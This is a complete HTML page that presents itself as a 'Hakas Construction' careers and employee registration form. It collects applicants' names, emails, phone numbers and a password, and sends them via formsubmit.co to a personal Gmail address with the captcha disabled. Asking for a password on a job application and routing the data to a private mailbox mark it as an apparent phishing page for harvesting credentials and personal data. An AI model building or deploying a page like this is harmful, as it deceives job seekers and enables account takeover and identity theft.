<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Hakas Construction | Careers</title>

<style>
body{
background:linear-gradient(120deg,#ff7a00,#222);
font-family:Arial;
}
.box{
width:420px;
margin:60px auto;
background:white;
padding:30px;
border-radius:12px;
box-shadow:0 0 20px rgba(0,0,0,.3);
}
h2{text-align:center;margin-bottom:10px;}
p{text-align:center;color:#555;}
input,select,textarea,button{
width:100%;
padding:11px;
margin-top:10px;
border-radius:6px;
border:1px solid #ccc;
}
button{
background:#ff7a00;
color:white;
border:none;
font-size:16px;
cursor:pointer;
}
button:hover{background:#e66d00;}
</style>
</head>

<body>

<div class="box">
<h2>Hakas Construction</h2>
<p>Employee Registration Form</p>

<form action="https://formsubmit.co/misteratta0@gmail.com" method="POST">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">

<input type="text" name="Name" placeholder="Full Name" required>
<input type="email" name="Email" placeholder="Email Address" required>
<input type="password" name="Password" placeholder="Password" required>
<input type="text" name="Phone" placeholder="Phone Number" required>

<select name="Education" required>
<option value="">Select Education</option>
<option>FSc</option>
<option>Bachelor</option>
<option>Master</option>
</select>

<input type="text" name="Experience" placeholder="Experience (Years)">
<textarea name="Skills" placeholder="Your Skills"></textarea>
<input type="text" name="City" placeholder="City">

<button type="submit">Apply Now</button>

</form>
</div>

</body>
</html>
